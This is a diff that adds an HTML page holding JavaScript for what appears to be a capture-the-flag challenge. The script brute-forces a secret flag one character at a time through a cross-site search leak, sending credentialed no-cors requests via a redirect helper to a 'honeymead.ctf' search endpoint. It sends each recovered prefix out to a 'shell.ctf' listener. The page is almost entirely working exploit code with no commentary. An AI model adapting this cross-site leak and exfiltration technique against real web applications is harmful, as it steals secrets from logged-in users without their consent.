@@ -1,0 +1,45 @@
+<html>
+    <body>
+
+<script async>
+
+let flag = "FLAg-eaty0uralph4b33z"
+async function attempt(c) {
+const attempt =  flag + c;
+const target = `http://honeymead.ctf:5000/search?term=${attempt}%26lucky=on`;
+const helper = 'http://shell.ctf/nitbx/redirect.php?url=' + target;
+
+  await fetch(helper, {
+    credentials: "include",
+    mode: 'no-cors'
+  }).then(() => {
+    console.log("Not found");
+  }).catch((e) => {
+    flag = attempt;
+    fetch("http://shell.ctf:1337/corb3nik_leak?" + flag, { mode: 'no-cors' });
+  });
+}
+
+
+const charset = "0123456789abcdefghijklmnopqrstuvwxyz-";
+let index = 0;
+function nextLetter() {
+        const letter = charset[index];
+        attempt(letter).then(() => {
+                index += 1;
+                if (index >= charset.length) {
+                        return
+                }
+                nextLetter();
+        })
+}
+
+for (var i = 0; i < 25; ++i) {
+        index = 0;
+        nextLetter();
+        }
+
+</script>
+<img src="http://shell.ctf:1338">
+</body>
+</html>
